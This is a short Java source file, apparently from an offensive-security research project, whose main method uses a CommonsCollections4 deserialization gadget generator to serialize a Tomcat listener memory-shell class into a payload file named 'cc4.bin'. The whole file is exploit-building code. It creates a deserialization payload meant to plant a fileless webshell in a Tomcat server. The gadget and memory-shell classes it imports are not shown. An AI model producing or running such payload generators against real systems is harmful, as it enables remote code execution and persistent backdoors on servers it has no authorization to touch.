package com.demo.utils;

import com.demo.memshell.whole.exec.TomcatListenerWebAppMS;
import org.tools.ser.CC4Generator;

/**
 * @author Whoopsunix
 */
public class PayloadMake {
    public static void main(String[] args) throws Exception {
        cc4();
    }

    public static void cc4() throws Exception {
        CC4Generator cc4Generator = new CC4Generator();
//        String payload = cc4Generator.make(TomcatListenerContextClassMS.class);
//        System.out.println(payload.length());
        cc4Generator.makeFile(TomcatListenerWebAppMS.class, "cc4.bin");
    }

}
